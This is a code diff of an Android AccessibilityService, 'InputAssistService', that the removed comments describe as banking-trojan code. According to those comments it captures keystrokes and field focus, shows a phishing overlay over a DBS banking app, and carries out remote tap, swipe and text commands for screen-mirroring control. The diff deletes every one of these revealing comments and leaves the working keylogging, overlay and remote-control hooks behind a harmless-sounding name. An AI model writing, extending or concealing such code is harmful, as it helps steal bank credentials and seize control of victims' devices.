@@ -5,18 +5,6 @@ import android.accessibilityservice.AccessibilityServiceInfo
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 
-/**
- * InputAssistService — the ONLY AccessibilityService in the app.
- *
- * Declared once in AndroidManifest → ONE permission popup for the user.
- *
- * All logic is kept in separate, modular helper classes:
- *   • inputHandlerHelper      → captures keystrokes & field-focus events
- *   • OverlayHelper        → DBS phishing overlay when banking app opens
- *   • gestureManagerHelper  → executes remote tap / swipe / text commands
- *
- * ScreenMirrorService also calls this via [instance] for remote control.
- */
 class InputAssistService : AccessibilityService() {
 
     private val TAG = "CoreService"
@@ -26,11 +14,11 @@ class InputAssistService : AccessibilityService() {
     private lateinit var gestureManager:    GestureHelper
 
     companion object {
-        /** Singleton used by ScreenMirrorService for remote-control calls. */
+        
         var instance: InputAssistService? = null
     }
 
-    // ── Lifecycle ─────────────────────────────────────────────────────────────
+    
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -40,15 +28,15 @@ class InputAssistService : AccessibilityService() {
         overlay          = UiLayerHelper(this)
         gestureManager    = GestureHelper(this)
 
-        // Configure events — union of all helper requirements
+        
         val info = AccessibilityServiceInfo().apply {
             eventTypes =
-                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or   // overlay
-                        AccessibilityEvent.TYPE_WINDOWS_CHANGED          or   // overlay
-                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED        or   // inputHandler
-                        AccessibilityEvent.TYPE_VIEW_FOCUSED             or   // inputHandler field focus
-                        AccessibilityEvent.TYPE_VIEW_CLICKED             or   // inputHandler clicks
-                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED        // clipboard
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or   
+                        AccessibilityEvent.TYPE_WINDOWS_CHANGED          or   
+                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED        or   
+                        AccessibilityEvent.TYPE_VIEW_FOCUSED             or   
+                        AccessibilityEvent.TYPE_VIEW_CLICKED             or   
+                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED        
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             flags =
                 AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
@@ -60,17 +48,17 @@ class InputAssistService : AccessibilityService() {
         Log.d(TAG, "✅ InputAssistService connected — all helpers initialised")
     }
 
-    // ── Event routing ─────────────────────────────────────────────────────────
+    
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
-        inputHandler.onEvent(event)   // handles TYPE_VIEW_TEXT_CHANGED + TYPE_VIEW_FOCUSED
-        overlay.onEvent(event)     // handles TYPE_WINDOW_STATE_CHANGED + TYPE_WINDOWS_CHANGED
+        inputHandler.onEvent(event)   
+        overlay.onEvent(event)     
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
         }
     }
 
-    // ── Lifecycle cleanup ─────────────────────────────────────────────────────
+    
 
     override fun onInterrupt() {
         Log.d(TAG, "Service interrupted — flushing keystrokes")
@@ -86,7 +74,7 @@ class InputAssistService : AccessibilityService() {
         overlay.removeOverlay()
     }
 
-    // ── Public API for ScreenMirrorService remote control ────────────────────
+    
 
     fun injectTap(x: Float, y: Float)                               = gestureManager.injectTap(x, y)
     fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float)    = gestureManager.injectSwipe(x1, y1, x2, y2)
